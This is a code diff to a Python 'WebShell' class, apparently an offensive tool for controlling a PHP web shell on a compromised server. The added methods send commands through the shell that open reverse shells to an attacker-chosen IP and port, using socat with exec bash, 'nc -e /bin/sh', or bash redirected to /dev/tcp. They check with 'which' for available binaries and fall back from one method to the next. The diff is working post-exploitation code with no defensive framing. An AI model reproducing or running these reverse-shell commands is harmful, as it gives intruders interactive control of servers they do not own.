@@ -95,9 +95,9 @@ class WebShell():
                 return (True, content.split(token)[1])
             else:
                 return (False, content)
-        except:
-            Log.error("The connection is aborted!")
-            return (False, "The connection is aborted!")
+        except Exception as e:
+            Log.error(e)
+            return (False, e)
 
     def php_code_exec_token(self, code):
         token = random_string(32, string.letters)
@@ -150,8 +150,49 @@ class WebShell():
         # TODO
         pass
 
-    def reverse_shell(self, ip, port):
+    def reverse_shell_socat(self, binary, ip, port):
+        Log.success("Using socat to get a reverse shell...")
+        return self.auto_exec("%s tcp-connect:%s:%s exec:'bash -li',pty,stderr,setsid,sigint,sane" % (binary, ip, port))
+
+    def reverse_shell_nc(self, binary, ip, port):
+        Log.success("Using nc to get a reverse shell...")
+        return self.auto_exec("%s -e /bin/sh %s %s" % (binary, ip, port))
+
+    def reverse_shell_bash(self, ip, port):
+        Log.success("Using bash to get a reverse shell...")
         return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'" % (ip, port))
+
+    def reverse_shell(self, ip, port):
+        result = self.check_bin_exists("socat")
+        if result[0]:
+            content = result[1][0:-1]
+            if content != "":
+                path = content
+                Log.success("socat found! Path : [%s]" % path)
+                self.reverse_shell_socat(path, ip, port)
+                return
+            else:
+                Log.error("socat not found!")
+        else:
+            Log.error("Some error occured!")
+        result = self.check_bin_exists("nc")
+        if result[0]:
+            content = result[1][0:-1]
+            if content != "":
+                path = content
+                Log.success("nc found! Path : [%s]" % path)
+                self.reverse_shell_nc(path, ip, port)
+                return
+            else:
+                Log.error("nc not found!")
+        else:
+            Log.error("Some error occured!")
+        self.reverse_shell_bash(ip, port)
+        return
+
+    def check_bin_exists(self, binary):
+        Log.info("Checking the binary file : [%s]" % binary)
+        return self.auto_exec("which %s" % (binary))
 
     def check_function_exist(self, function_name):
         result = self.php_code_exec('var_dump(function_exists(%s));' % (function_name))
